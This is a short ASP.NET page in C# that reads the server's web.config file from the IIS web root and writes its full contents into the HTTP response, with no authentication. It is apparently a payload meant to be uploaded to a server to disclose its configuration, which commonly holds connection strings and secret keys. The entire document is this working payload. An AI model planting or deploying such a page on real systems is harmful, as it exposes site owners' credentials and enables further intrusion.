<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Hosting" %>

<% 
	string filePath = "C:\\inetpub\\wwwroot\\web.config";

	string content = File.ReadAllText(filePath);
	Response.Write(content);
%>